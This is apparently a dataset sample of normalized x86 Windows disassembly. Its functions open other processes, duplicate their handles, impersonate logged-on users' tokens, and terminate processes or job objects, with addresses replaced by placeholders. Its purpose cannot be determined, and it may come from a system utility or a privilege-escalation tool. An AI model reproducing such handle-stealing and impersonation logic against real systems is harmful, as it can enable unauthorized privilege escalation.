mov edx [ esp + 0x24 ]
mov eax [ edi ]
push edx
push eax
call sub_40bf90
add esp 0x8
test al al
je r-xdata
push 0xa
mov ecx rw-data
call sub_408340
mov eax [ rw-data ]
mov eax [ eax + 0x4 ]
xor edi edi
test [ eax + rw-data ] 0x6
jne r-xdata
mov ecx [ esp + 0x20 ]
push ecx
call [ GetProcessId@IAT ]
mov edi eax
push edi
push rw-data
call sub_408170
cmp [ esp + 0x13 ] 0x0
je r-xdata
push esi
lea eax [ esp + 0xc0 ]
push 0x1
push eax
call sub_40e020
add esp 0xc
push eax
push rw-data
mov [ esp + 0xf0 ] 0x3
call sub_40a0a0
add esp 0x8
lea esi [ esp + 0xbc ]
call sub_4218d0
xor esi esi
lea ebx [ esi + 0x7 ]
lea ecx [ esp + 0x84 ]
push ecx
push ecx
push 0x5c
push ecx
lea edx [ esp + 0xb0 ]
push edx
push ecx
push 0x9
push rw-data
call sub_40e950
add esp 0xc
push eax
call sub_40a0a0
add esp 0xc
push eax
call sub_40e950
add esp 0xc
push eax
call sub_40a0a0
add esp 0x8
jmp r-xdata
xor esi esi
cmp [ ebx + 0x38 ] 0x8
jb r-xdata
mov ecx [ rw-data ]
mov ecx [ ecx + 0x4 ]
add ecx rw-data
cmp edi esi
je r-xdata
mov eax [ eax + rw-data ]
mov edx [ eax ]
mov ecx eax
mov eax [ edx + 0x34 ]
call eax
cmp eax 0xffffffff
jne r-xdata
push 0x40
call sub_438178
add esp 0x4
cmp eax esi
je r-xdata
xor edx edx
mov [ esp + 0xe8 ] dl
mov [ esp + 0xb4 ] ebx
mov [ esp + 0xb0 ] esi
mov [ esp + 0xa0 ] dx
cmp [ esp + 0x98 ] edi
jb r-xdata
mov ecx [ esp + 0xa0 ]
push ecx
call sub_43811c
add esp 0x4
mov edi 0x8
cmp [ esp + 0xb4 ] edi
jb r-xdata
xor eax eax
mov [ ebx + 0x38 ] 0x7
mov [ ebx + 0x34 ] 0x0
push ebx
mov [ ebx + 0x24 ] ax
call sub_43811c
add esp 0x4
mov eax [ ebx + 0x24 ]
push eax
call sub_43811c
add esp 0x4
mov eax [ ecx + 0xc ]
or eax edi
cmp [ ecx + 0x38 ] esi
jne r-xdata
mov edi 0x4
xor ebx ebx
xor edx edx
mov [ eax + 0x38 ] 0x7
mov [ eax + 0x34 ] esi
mov [ eax + 0x24 ] dx
mov ebx eax
jmp r-xdata
mov eax [ esp + 0x84 ]
push eax
call sub_43811c
add esp 0x4
jmp r-xdata
push esi
push eax
call sub_402d50
or eax 0x4
test ebx ebx
je r-xdata
lea ecx [ ebx + 0x24 ]
push ecx
push ecx
push 0x9
push rw-data
call sub_40e950
add esp 0xc
push eax
call sub_40a0a0
add esp 0x8
mov eax [ esp + 0x24 ]
push eax
push edi
call sub_40bf90
add esp 0x8
test al al
je r-xdata
xor esi esi
cmp [ ebx + 0x38 ] 0x8
jb r-xdata
xor edx edx
mov [ ebx + 0x38 ] 0x7
mov [ ebx + 0x34 ] 0x0
push ebx
mov [ ebx + 0x24 ] dx
call sub_43811c
add esp 0x4
mov eax [ ebx + 0x24 ]
push eax
call sub_43811c
add esp 0x4
sub_419890
push ebp
mov ebp esp
and esp 0xfffffff8
push 0xffffffff
push sub_453358
mov eax [ fs : 0x0 ]
push eax
sub esp 0xa8
mov eax [ rw-data ]
xor eax esp
mov [ esp + 0xa0 ] eax
push ebx
push esi
push edi
mov eax [ rw-data ]
xor eax esp
push eax
lea eax [ esp + 0xb8 ]
mov [ fs : 0x0 ] eax
mov eax [ ebp + 0x8 ]
push 0x10
mov [ esp + 0x44 ] eax
call sub_438178
xor ebx ebx
add esp 0x4
cmp eax ebx
je r-xdata
mov [ esp + 0x34 ] ebx
mov [ eax ] ebx
mov [ eax + 0x4 ] ebx
mov [ eax + 0x8 ] ebx
mov [ esp + 0x34 ] eax
jmp r-xdata
mov [ esp + 0x1c ] ebx
mov esi ebx
mov esi eax
mov [ eax ] ebx
mov [ eax + 0x4 ] ebx
mov [ eax + 0x8 ] ebx
mov [ esp + 0x1c ] esi
jmp r-xdata
mov edi [ esp + 0x34 ]
xor ecx ecx
call sub_40b0d0
push 0x10
mov [ esp + 0x1f ] al
call sub_438178
add esp 0x4
cmp eax ebx
je r-xdata
push ebx
lea edx [ esp + 0x7c ]
push 0x1
push edx
call sub_40e020
add esp 0xc
push eax
push ecx
push r--data
push rw-data
mov [ esp + 0xd0 ] 0x4
call sub_409de0
add esp 0xc
push eax
call sub_40a0a0
add esp 0x8
mov edi eax
push 0xa
mov ecx edi
call sub_408340
mov eax [ edi ]
mov eax [ eax + 0x4 ]
xor esi esi
test [ eax + edi + 0xc ] 0x6
jne r-xdata
mov edi [ esi ]
mov [ esp + 0x24 ] edi
cmp edi [ esi + 0x4 ]
je r-xdata
push ebx
mov edi esi
call sub_40e5c0
add esp 0x4
test al al
je r-xdata
mov ecx [ edi ]
mov ecx [ ecx + 0x4 ]
add ecx edi
cmp esi ebx
je r-xdata
mov eax [ eax + edi + 0x38 ]
mov edx [ eax ]
mov ecx eax
mov eax [ edx + 0x34 ]
call eax
cmp eax 0xffffffff
jne r-xdata
cmp esi ebx
je r-xdata
mov edi edi
cmp [ esp + 0x8c ] 0x8
jb r-xdata
mov eax [ ecx + 0xc ]
or eax esi
cmp [ ecx + 0x38 ] ebx
jne r-xdata
mov esi 0x4
mov al 0x1
mov ecx [ esp + 0xb8 ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov ecx [ esp + 0xa0 ]
xor ecx esp
call sub_437c1c
mov esp ebp
pop ebp
retn
mov eax [ esi ]
cmp eax ebx
je r-xdata
add edi 0x10
mov [ esp + 0x24 ] edi
cmp edi [ esi + 0x4 ]
jne r-xdata
push 0x2
push ebx
push ebx
lea edx [ esp + 0x2c ]
push edx
call [ GetCurrentProcess@IAT ]
mov ecx [ esp + 0x4c ]
push eax
movzx eax [ edi + 0x6 ]
push eax
push ecx
call [ DuplicateHandle@IAT ]
test eax eax
je r-xdata
mov esi [ esp + 0x1c ]
mov edx [ esp + 0x78 ]
push edx
call sub_43811c
add esp 0x4
push ebx
push eax
call sub_402d50
or eax 0x4
push esi
mov [ esi ] ebx
mov [ esi + 0x4 ] ebx
mov [ esi + 0x8 ] ebx
call sub_43811c
add esp 0x4
push eax
call sub_43811c
add esp 0x4
mov ecx [ edi ]
push ecx
push ebx
push 0x40
call [ OpenProcess@IAT ]
mov [ esp + 0x3c ] eax
cmp eax ebx
je r-xdata
jmp r-xdata
mov ecx [ esp + 0x3c ]
push ecx
call [ CloseHandle@IAT ]
xor edx edx
mov [ esp + 0x8c ] 0x7
mov [ esp + 0x88 ] ebx
mov [ esp + 0x78 ] dx
mov [ esp + 0xc0 ] ebx
mov edi [ esp + 0x20 ]
lea eax [ esp + 0x14 ]
push eax
mov [ esp + 0x18 ] ebx
call sub_40e710
add esp 0x4
cmp al bl
je r-xdata
mov edx [ esp + 0x20 ]
push edx
call [ CloseHandle@IAT ]
mov [ esp + 0xc0 ] 0xffffffff
cmp [ esp + 0x8c ] 0x8
jb r-xdata
mov eax [ esp + 0x14 ]
movzx ecx [ eax ]
mov eax [ eax + 0x4 ]
shr ecx 0x1
push ecx
lea ecx [ esp + 0x7c ]
call sub_401c90
mov edx [ esp + 0x14 ]
push edx
call sub_438111
mov eax [ esp + 0x7c ]
add esp 0x4
cmp [ esp + 0x8c ] 0x8
jae r-xdata
mov edi [ esp + 0x24 ]
mov eax [ esp + 0x78 ]
push eax
call sub_43811c
add esp 0x4
push r--data
push eax
call sub_438e70
add esp 0x8
test eax eax
jne r-xdata
lea eax [ esp + 0x78 ]
cmp [ esp + 0x1b ] bl
je r-xdata
push 0x40
call sub_438178
add esp 0x4
cmp eax ebx
je r-xdata
mov [ esp + 0x14 ] ebx
xor ecx ecx
mov [ eax + 0x38 ] 0x7
mov [ eax + 0x34 ] ebx
mov [ eax + 0x24 ] cx
mov [ esp + 0x14 ] eax
jmp r-xdata
mov [ esp + 0x2c ] ebx
mov edi ebx
xor edx edx
mov edi eax
mov [ eax + 0x38 ] 0x7
mov [ eax + 0x34 ] ebx
mov [ eax + 0x24 ] dx
mov [ esp + 0x2c ] edi
jmp r-xdata
push 0x40
call sub_438178
add esp 0x4
cmp eax ebx
je r-xdata
test edi edi
je r-xdata
mov eax [ esp + 0x38 ]
push esi
push eax
mov ebx edi
call sub_40bf90
add esp 0x8
test al al
je r-xdata
mov eax [ esp + 0x20 ]
push eax
call [ GetProcessId@IAT ]
mov ecx [ esp + 0x24 ]
mov esi [ esp + 0x34 ]
mov edx [ ecx ]
mov ebx [ esp + 0x14 ]
push esi
push edx
mov [ esp + 0x40 ] eax
call sub_40bf90
add esp 0x8
test al al
je r-xdata
mov esi [ esp + 0x14 ]
test esi esi
je r-xdata
cmp [ edi + 0x38 ] 0x8
jb r-xdata
mov eax [ esp + 0x40 ]
mov esi [ eax ]
mov [ esp + 0x30 ] esi
cmp esi [ eax + 0x4 ]
je r-xdata
mov esi [ esp + 0x1c ]
xor ebx ebx
cmp [ esi + 0x38 ] 0x8
jb r-xdata
xor eax eax
mov [ edi + 0x38 ] 0x7
mov [ edi + 0x34 ] 0x0
push edi
mov [ edi + 0x24 ] ax
call sub_43811c
add esp 0x4
mov eax [ edi + 0x24 ]
push eax
call sub_43811c
add esp 0x4
add edi 0x24
xor ecx ecx
mov [ esi + 0x38 ] 0x7
mov [ esi + 0x34 ] 0x0
push esi
mov [ esi + 0x24 ] cx
call sub_43811c
add esp 0x4
mov eax [ esi + 0x24 ]
push eax
call sub_43811c
add esp 0x4
mov ecx esi
mov ecx [ esi ]
jmp r-xdata
mov eax edi
mov eax [ edi ]
jmp r-xdata
cmp [ edi + 0x14 ] eax
jb r-xdata
mov edx [ esp + 0x40 ]
add esi 0x1c
mov [ esp + 0x30 ] esi
cmp esi [ edx + 0x4 ]
jne r-xdata
push eax
lea ecx [ esp + 0x68 ]
push 0x5
push ecx
call sub_4374b3
add esp 0xc
mov ecx eax
mov esi rw-data
call sub_40e920
mov esi eax
mov edx [ esi ]
mov eax [ edx + 0x4 ]
push 0x0
lea edx [ esp + 0x48 ]
mov ecx 0x20
push 0x19
push edx
mov [ eax + esi + 0x40 ] cx
call sub_4374b3
mov ebx [ esp + 0x30 ]
add esp 0xc
push r--data
push ecx
mov ecx [ ebx ]
push ecx
push esi
mov [ esp + 0x38 ] eax
call sub_408170
add esp 0x4
push eax
call sub_409de0
mov ecx [ esp + 0x30 ]
mov esi eax
call sub_40e920
mov esi eax
mov edx [ esi ]
mov eax [ edx + 0x4 ]
push 0x0
lea edx [ esp + 0x60 ]
mov ecx 0x20
push 0x5
push edx
mov [ eax + esi + 0x40 ] cx
call sub_4374b3
mov ecx [ esp + 0x28 ]
add esp 0x14
push r--data
push sub_418ea0
add ecx 0x24
push ecx
push sub_418e80
mov [ esp + 0x38 ] eax
call sub_40e790
push eax
call sub_40a0a0
add esp 0x8
mov esi eax
call sub_40e790
push eax
call sub_409de0
mov ecx [ esp + 0x30 ]
add esp 0x8
mov esi eax
call sub_40e920
mov edx [ eax ]
mov ecx [ edx + 0x4 ]
push edi
add ecx eax
push ecx
push 0x9
push ecx
mov edx 0x20
mov [ ecx + 0x40 ] dx
mov ecx [ esp + 0x48 ]
movzx edx [ ebx + 0x6 ]
push ecx
push ecx
push 0x9
push ecx
push edx
push eax
call sub_41a660
add esp 0x4
push eax
call sub_40e950
add esp 0xc
push eax
call sub_408170
add esp 0x4
push eax
call sub_40e950
add esp 0xc
push eax
call sub_40a0a0
add esp 0x8
mov esi eax
push 0xa
mov ecx esi
call sub_408340
mov eax [ esi ]
mov eax [ eax + 0x4 ]
xor ebx ebx
test [ eax + esi + 0xc ] 0x6
jne r-xdata
push ecx
push eax
call sub_438e70
add esp 0x8
test eax eax
jne r-xdata
mov eax 0x8
cmp [ esi + 0x14 ] eax
jb r-xdata
mov edi [ esp + 0x2c ]
mov ecx [ esi ]
mov ecx [ ecx + 0x4 ]
add ecx esi
test ebx ebx
je r-xdata
mov eax [ eax + esi + 0x38 ]
mov edx [ eax ]
mov ecx eax
mov eax [ edx + 0x34 ]
call eax
cmp eax 0xffffffff
jne r-xdata
push r--data
push rw-data
call sub_409de0
mov edx [ esp + 0x28 ]
add esp 0x8
push 0x0
push edx
call [ TerminateProcess@IAT ]
test eax eax
je r-xdata
mov eax [ ecx + 0xc ]
or eax ebx
cmp [ ecx + 0x38 ] 0x0
jne r-xdata
mov ebx 0x4
push 0x0
lea eax [ esp + 0x98 ]
push 0x1
push eax
call sub_40e020
add esp 0xc
push r--data
push ecx
push eax
push ecx
push r--data
push rw-data
mov [ esp + 0xd8 ] 0x1
call sub_409de0
add esp 0xc
push eax
call sub_40a0a0
add esp 0xc
mov esi eax
call sub_408150
push eax
call sub_409de0
add esp 0x8
lea esi [ esp + 0x94 ]
mov [ esp + 0xc0 ] 0x0
call sub_4218d0
push 0x0
push 0x0
call [ CreateJobObjectW@IAT ]
mov ebx eax
test ebx ebx
je r-xdata
push r--data
push rw-data
call sub_409de0
add esp 0x8
jmp r-xdata
push 0x0
push eax
call sub_402d50
or eax 0x4
push 0xa
mov ecx rw-data
call sub_408340
mov ecx [ rw-data ]
mov eax [ ecx + 0x4 ]
xor esi esi
test [ eax + rw-data ] 0x6
jne r-xdata
mov ecx [ esp + 0x20 ]
push ecx
push ebx
call [ AssignProcessToJobObject@IAT ]
test eax eax
je r-xdata
mov ecx [ rw-data ]
mov ecx [ ecx + 0x4 ]
add ecx rw-data
test esi esi
je r-xdata
mov eax [ eax + rw-data ]
mov edx [ eax ]
mov ecx eax
mov eax [ edx + 0x34 ]
call eax
cmp eax 0xffffffff
jne r-xdata
push 0x0
lea eax [ esp + 0x98 ]
push 0x1
push eax
call sub_40e020
add esp 0xc
push eax
push ecx
mov [ esp + 0xc8 ] 0x3
push r--data
push r--data
push rw-data
call sub_409de0
add esp 0x8
push 0x0
push ebx
call [ TerminateJobObject@IAT ]
test eax eax
je r-xdata
mov esi [ esp + 0x30 ]
mov eax [ ecx + 0xc ]
or eax esi
cmp [ ecx + 0x38 ] 0x0
jne r-xdata
mov esi 0x4
push 0x0
lea edx [ esp + 0x98 ]
push 0x1
push edx
call sub_40e020
add esp 0xc
push eax
push ecx
mov [ esp + 0xc8 ] 0x2
push r--data
jmp r-xdata
push r--data
push rw-data
call sub_409de0
add esp 0x8
jmp r-xdata
push 0x0
push eax
call sub_402d50
or eax 0x4
push rw-data
call sub_409de0
add esp 0xc
push eax
call sub_40a0a0
add esp 0x8
lea esi [ esp + 0x94 ]
mov [ esp + 0xc0 ] 0x0
call sub_4218d0
push ebx
call [ CloseHandle@IAT ]
sub_41a010
push ebp
mov ebp esp
and esp 0xfffffff8
push 0xffffffff
push sub_4532fb
mov eax [ fs : 0x0 ]
push eax
sub esp 0xd0
mov eax [ rw-data ]
xor eax esp
mov [ esp + 0xc8 ] eax
push ebx
push esi
push edi
mov eax [ rw-data ]
xor eax esp
push eax
lea eax [ esp + 0xe0 ]
mov [ fs : 0x0 ] eax
mov eax [ ebp + 0x8 ]
push r--data
push r--data
mov [ esp + 0x38 ] eax
call [ GetModuleHandleW@IAT ]
push eax
call [ GetProcAddress@IAT ]
push 0x10
call sub_438178
xor esi esi
add esp 0x4
cmp eax esi
je r-xdata
mov [ esp + 0x28 ] esi
mov [ eax ] esi
mov [ eax + 0x4 ] esi
mov [ eax + 0x8 ] esi
mov [ esp + 0x28 ] eax
jmp r-xdata
mov [ esp + 0x14 ] esi
mov edi esi
mov edi eax
mov [ eax ] esi
mov [ eax + 0x4 ] esi
mov [ eax + 0x8 ] esi
mov [ esp + 0x14 ] edi
jmp r-xdata
mov edi [ esp + 0x28 ]
xor ecx ecx
call sub_40b0d0
push 0x10
mov [ esp + 0x23 ] al
call sub_438178
add esp 0x4
cmp eax esi
je r-xdata
push esi
lea ecx [ esp + 0x88 ]
push 0x1
push ecx
call sub_40e020
add esp 0xc
push eax
push ecx
push r--data
push rw-data
mov [ esp + 0xf8 ] 0x6
call sub_409de0
add esp 0xc
push eax
call sub_40a0a0
add esp 0x8
mov edi eax
push 0xa
mov ecx edi
call sub_408340
mov edx [ edi ]
mov eax [ edx + 0x4 ]
xor ebx ebx
test [ eax + edi + 0xc ] 0x6
jne r-xdata
mov ebx [ edi ]
mov edi [ esp + 0x14 ]
mov [ esp + 0x20 ] ebx
cmp ebx [ edi + 0x4 ]
je r-xdata
push esi
call sub_40e5c0
add esp 0x4
test al al
je r-xdata
mov ecx [ edi ]
mov ecx [ ecx + 0x4 ]
add ecx edi
cmp ebx esi
je r-xdata
mov eax [ eax + edi + 0x38 ]
mov edx [ eax ]
mov ecx eax
mov eax [ edx + 0x34 ]
call eax
cmp eax 0xffffffff
jne r-xdata
cmp edi esi
je r-xdata
mov ecx [ ebx ]
push ecx
push esi
push 0x40
call [ OpenProcess@IAT ]
mov edi eax
mov [ esp + 0x2c ] edi
cmp edi esi
je r-xdata
cmp [ esp + 0x98 ] 0x8
jb r-xdata
mov eax [ ecx + 0xc ]
or eax ebx
cmp [ ecx + 0x38 ] esi
jne r-xdata
mov ebx 0x4
mov al 0x1
mov ecx [ esp + 0xe0 ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov ecx [ esp + 0xc8 ]
xor ecx esp
call sub_437c1c
mov esp ebp
pop ebp
retn
mov eax [ edi ]
cmp eax esi
je r-xdata
mov eax [ esp + 0x14 ]
add ebx 0x10
mov [ esp + 0x20 ] ebx
cmp ebx [ eax + 0x4 ]
jne r-xdata
push 0x2
push esi
push esi
lea edx [ esp + 0x30 ]
push edx
call [ GetCurrentProcess@IAT ]
push eax
movzx eax [ ebx + 0x6 ]
push eax
push edi
call [ DuplicateHandle@IAT ]
test eax eax
je r-xdata
mov edi [ esp + 0x14 ]
mov edx [ esp + 0x84 ]
push edx
call sub_43811c
add esp 0x4
push esi
push eax
call sub_402d50
or eax 0x4
push edi
mov [ edi ] esi
mov [ edi + 0x4 ] esi
mov [ edi + 0x8 ] esi
call sub_43811c
add esp 0x4
push eax
call sub_43811c
add esp 0x4
jmp r-xdata
push edi
call [ CloseHandle@IAT ]
xor ecx ecx
mov [ esp + 0xb4 ] 0x7
mov [ esp + 0xb0 ] esi
mov [ esp + 0xa0 ] cx
mov [ esp + 0xe8 ] esi
mov edi [ esp + 0x24 ]
lea edx [ esp + 0x18 ]
push edx
mov [ esp + 0x1c ] esi
call sub_40e710
add esp 0x4
test al al
je r-xdata
mov ecx [ esp + 0x24 ]
push ecx
call [ CloseHandle@IAT ]
mov [ esp + 0xe8 ] 0xffffffff
cmp [ esp + 0xb4 ] 0x8
jb r-xdata
mov eax [ esp + 0x18 ]
movzx ecx [ eax ]
mov eax [ eax + 0x4 ]
shr ecx 0x1
push ecx
lea ecx [ esp + 0xa4 ]
call sub_401c90
mov edx [ esp + 0x18 ]
push edx
call sub_438111
mov eax [ esp + 0xa4 ]
add esp 0x4
cmp [ esp + 0xb4 ] 0x8
jae r-xdata
mov edi [ esp + 0x2c ]
mov edx [ esp + 0xa0 ]
push edx
call sub_43811c
add esp 0x4
push r--data
push eax
call sub_438e70
add esp 0x8
test eax eax
jne r-xdata
lea eax [ esp + 0xa0 ]
cmp [ esp + 0x1f ] al
je r-xdata
push 0x40
call sub_438178
add esp 0x4
cmp eax esi
je r-xdata
xor ebx ebx
xor ecx ecx
mov [ eax + 0x38 ] 0x7
mov [ eax + 0x34 ] esi
mov [ eax + 0x24 ] cx
mov ebx eax
jmp r-xdata
test ebx ebx
je r-xdata
mov eax 0x7
xor esi esi
xor edx edx
mov [ esp + 0x7c ] eax
mov [ esp + 0x78 ] esi
mov [ esp + 0x68 ] dx
mov [ esp + 0x98 ] eax
xor eax eax
mov [ esp + 0x94 ] esi
mov [ esp + 0x84 ] ax
lea ecx [ esp + 0x84 ]
push ecx
lea edx [ esp + 0x6c ]
mov [ esp + 0xec ] 0x2
mov edi [ esp + 0x28 ]
push edx
call sub_40d650
add esp 0x8
test al al
je r-xdata
mov edx [ esp + 0x28 ]
mov eax [ esp + 0x20 ]
mov ecx [ eax ]
push edx
push ecx
call sub_40bf90
add esp 0x8
test al al
je r-xdata
mov ebx [ esp + 0x20 ]
xor esi esi
cmp [ ebx + 0x38 ] 0x8
jb r-xdata
push esi
lea edx [ esp + 0xc0 ]
push 0x1
push edx
call sub_40e020
add esp 0xc
push eax
push rw-data
mov [ esp + 0xf0 ] 0x5
call sub_40a0a0
add esp 0x8
mov ecx [ esp + 0x30 ]
mov eax [ ecx ]
cmp eax [ ecx + 0x4 ]
jne r-xdata
xor eax eax
mov [ ebx + 0x38 ] 0x7
mov [ ebx + 0x34 ] 0x0
push ebx
mov [ ebx + 0x24 ] ax
call sub_43811c
add esp 0x4
mov eax [ ebx + 0x24 ]
push eax
call sub_43811c
add esp 0x4
cmp [ eax + 0x14 ] 0x8
jb r-xdata
mov eax r--data
jmp r-xdata
cmp [ esp + 0x7c ] 0x8
mov ecx [ esp + 0x68 ]
jae r-xdata
mov eax [ eax ]
push eax
push ecx
call sub_438e70
add esp 0x8
test eax eax
jne r-xdata
lea ecx [ esp + 0x68 ]
lea esi [ esp + 0x84 ]
call sub_4218d0
lea esi [ esp + 0x68 ]
call sub_4218d0
push esi
lea eax [ esp + 0x48 ]
push 0x5
push eax
call sub_4374b3
add esp 0xc
mov ecx eax
mov esi rw-data
call sub_40e920
mov esi eax
mov ecx [ esi ]
mov eax [ ecx + 0x4 ]
mov edx 0x20
push 0x0
mov [ eax + esi + 0x40 ] dx
lea eax [ esp + 0x38 ]
push 0x19
push eax
call sub_4374b3
mov edi [ esp + 0x2c ]
add esp 0xc
push r--data
push ecx
mov ecx [ edi ]
push ecx
push esi
mov [ esp + 0x28 ] eax
call sub_408170
add esp 0x4
push eax
call sub_409de0
mov ecx [ esp + 0x20 ]
mov esi eax
call sub_40e920
mov esi eax
mov edx [ esi ]
mov eax [ edx + 0x4 ]
push 0x0
lea edx [ esp + 0x60 ]
mov ecx 0x20
push 0x5
push edx
mov [ eax + esi + 0x40 ] cx
call sub_4374b3
add esp 0x14
push r--data
push sub_418ea0
lea ecx [ ebx + 0x24 ]
push ecx
push sub_418e80
mov [ esp + 0x28 ] eax
call sub_40e790
push eax
call sub_40a0a0
add esp 0x8
mov esi eax
call sub_40e790
push eax
call sub_409de0
mov ecx [ esp + 0x20 ]
add esp 0x8
mov esi eax
call sub_40e920
mov edx [ eax ]
mov ecx [ edx + 0x4 ]
push 0x9
add ecx eax
push ecx
mov edx 0x20
mov [ ecx + 0x40 ] dx
lea ecx [ esp + 0x70 ]
push ecx
push ecx
push 0x5c
push ecx
lea edx [ esp + 0x9c ]
push edx
push ecx
push 0x9
push ecx
movzx ecx [ edi + 0x6 ]
push ecx
push eax
call sub_41a660
add esp 0x4
push eax
call sub_40e950
add esp 0xc
push eax
call sub_40a0a0
add esp 0xc
push eax
call sub_40e950
add esp 0xc
push eax
call sub_40a0a0
add esp 0xc
push eax
call sub_40e950
add esp 0x8
lea esi [ esp + 0x24 ]
call sub_40d6d0
test al al
je r-xdata
push 0x0
lea ecx [ esp + 0xc0 ]
push 0x1
push ecx
call sub_40e020
add esp 0xc
push eax
push ecx
mov [ esp + 0xf0 ] 0x4
push r--data
jmp r-xdata
mov edx [ esp + 0x24 ]
push edx
call [ ImpersonateLoggedOnUser@IAT ]
test eax eax
jne r-xdata
push rw-data
call sub_409de0
add esp 0xc
push eax
call sub_40a0a0
add esp 0x8
mov esi eax
call sub_408150
jmp r-xdata
push r--data
push rw-data
call sub_409de0
add esp 0x8
mov esi eax
call sub_408150
lea esi [ esp + 0x84 ]
call sub_4218d0
lea esi [ esp + 0x68 ]
call sub_4218d0
lea esi [ esp + 0xa0 ]
call sub_4218d0
xor esi esi
jmp r-xdata
push eax
lea eax [ esp + 0xc0 ]
push 0x1
push eax
call sub_40e020
add esp 0xc
push eax
push ecx
mov [ esp + 0xf0 ] 0x3
push r--data
lea esi [ esp + 0xbc ]
call sub_4218d0
sub_41a660
push ebp
mov ebp esp
push 0xffffffff
push sub_451d42
mov eax [ fs : 0x0 ]
push eax
sub esp 0x24
push ebx
push esi
push edi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov [ ebp - 0x10 ] esp
mov ebx [ ebp + 0x8 ]
mov eax [ ebx ]
mov ecx [ eax + 0x4 ]
mov ecx [ ecx + ebx + 0x38 ]
xor esi esi
mov [ ebp - 0x14 ] esi
mov [ ebp - 0x30 ] ebx
cmp ecx esi
je r-xdata
mov [ ebp - 0x4 ] esi
mov ecx [ ebx ]
mov eax [ ecx + 0x4 ]
cmp [ eax + ebx + 0xc ] esi
jne r-xdata
mov edx [ ecx ]
mov eax [ edx + 0x4 ]
call eax
mov eax [ ebx ]
mov ecx [ eax + 0x4 ]
cmp [ ecx + ebx + 0xc ] esi
sete cl
mov [ ebp - 0x2c ] cl
mov [ ebp - 0x4 ] 0x1
test cl cl
je r-xdata
mov eax [ eax + ebx + 0x3c ]
cmp eax esi
je r-xdata
mov edx [ ebx ]
mov ecx [ edx + 0x4 ]
mov edx [ ebp - 0x14 ]
add ecx ebx
test edx edx
je r-xdata
mov ecx [ eax + 0x4 ]
lea edx [ ebp - 0x18 ]
push edx
add ecx ebx
call sub_402e50
mov edi eax
mov [ ebp - 0x4 ] 0x2
call sub_40a340
mov [ ebp - 0x4 ] 0x1
mov edi [ ebp - 0x18 ]
mov [ ebp - 0x24 ] eax
cmp edi esi
je r-xdata
mov ecx eax
call sub_403670
mov [ ebp - 0x4 ] 0x5
call j_sub_43d14a
test al al
jne r-xdata
mov eax [ ecx + 0xc ]
or eax edx
cmp [ ecx + 0x38 ] 0x0
jne r-xdata
mov [ ebp - 0x4 ] 0x3
mov ecx [ ebx ]
mov eax [ ecx + 0x4 ]
mov ecx [ ecx + 0x4 ]
mov edx [ ecx + ebx + 0x38 ]
movzx ecx [ ecx + ebx + 0x40 ]
push edx
mov [ ebp - 0x20 ] 0x0
mov edx [ ebp - 0x20 ]
push edx
movzx edx [ ebp + 0xc ]
push ecx
mov ecx [ ebp - 0x24 ]
add eax ebx
push eax
lea esi [ ebp - 0x28 ]
call sub_4084c0
cmp [ eax ] 0x0
je r-xdata
push esi
lea ecx [ ebp - 0x1c ]
call sub_436188
mov eax [ edi + 0x4 ]
cmp eax esi
jbe r-xdata
mov [ ebp - 0x4 ] 0xffffffff
mov eax [ ebx ]
mov ecx [ eax + 0x4 ]
mov ecx [ ecx + ebx + 0x38 ]
test ecx ecx
je r-xdata
mov ecx ebx
call sub_404650
push 0x0
push eax
call sub_402d50
or eax 0x4
mov [ ebp - 0x4 ] 0x1
jmp r-xdata
mov [ ebp - 0x14 ] 0x4
mov esi [ edi + 0x4 ]
neg esi
sbb esi esi
lea ecx [ ebp - 0x1c ]
not esi
call sub_4361b0
and esi edi
je r-xdata
cmp eax 0xffffffff
jae r-xdata
mov eax ebx
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
mov edx [ ecx ]
mov eax [ edx + 0x8 ]
call eax
mov eax [ esi ]
mov edx [ eax ]
push 0x1
mov ecx esi
call edx
dec eax
mov [ edi + 0x4 ] eax
sub_41a78a
mov eax [ ebp + 0x8 ]
mov ecx [ eax ]
mov ecx [ ecx + 0x4 ]
add ecx eax
mov eax [ ecx + 0xc ]
or eax 0x4
cmp [ ecx + 0x38 ] 0x0
jne r-xdata
push 0x1
push eax
call sub_402d50
mov [ ebp - 0x4 ] 0x1
mov eax r-xdata
retn
or eax 0x4
sub_41a830
push ebp
mov ebp esp
push 0xffffffff
push sub_45405e
mov eax [ fs : 0x0 ]
push eax
sub esp 0xc0
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x10 ] eax
push ebx
push esi
push edi
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
xor esi esi
mov edi ecx
mov [ ebp - 0xc8 ] esi
mov [ ebp - 0xcc ] edi
mov [ edi ] esi
mov [ edi + 0x4 ] esi
mov [ edi + 0x8 ] esi
mov [ ebp - 0x4 ] esi
xor eax eax
mov [ ebp - 0xc0 ] ax
mov ebx 0x7
push 0x3
mov eax r--data
lea ecx [ ebp - 0xc0 ]
mov [ ebp - 0xc8 ] 0x1
mov [ ebp - 0xc4 ] sub_41b100
mov [ ebp - 0xac ] ebx
mov [ ebp - 0xb0 ] esi
call sub_401c90
mov [ ebp - 0x4 ] 0x1
xor ecx ecx
mov [ ebp - 0xa4 ] cx
push 0x2f
mov eax r--data
lea ecx [ ebp - 0xa4 ]
mov [ ebp - 0x90 ] ebx
mov [ ebp - 0x94 ] esi
call sub_401c90
lea eax [ ebp - 0xc4 ]
mov [ ebp - 0x4 ] 0x2
call sub_4173f0
xor edx edx
push ebx
mov eax r--data
lea ecx [ ebp - 0x84 ]
mov [ ebp - 0x88 ] sub_41aa80
mov [ ebp - 0x70 ] ebx
mov [ ebp - 0x74 ] esi
mov [ ebp - 0x84 ] dx
call sub_401c90
mov [ ebp - 0x4 ] 0x3
xor eax eax
mov [ ebp - 0x68 ] ax
push 0x35
mov eax r--data
lea ecx [ ebp - 0x68 ]
mov [ ebp - 0x54 ] ebx
mov [ ebp - 0x58 ] esi
call sub_401c90
lea eax [ ebp - 0x88 ]
mov [ ebp - 0x4 ] 0x4
call sub_4173f0
xor ecx ecx
mov [ ebp - 0x48 ] cx
push ebx
mov eax r--data
lea ecx [ ebp - 0x48 ]
mov [ ebp - 0x4c ] sub_41ad50
mov [ ebp - 0x34 ] ebx
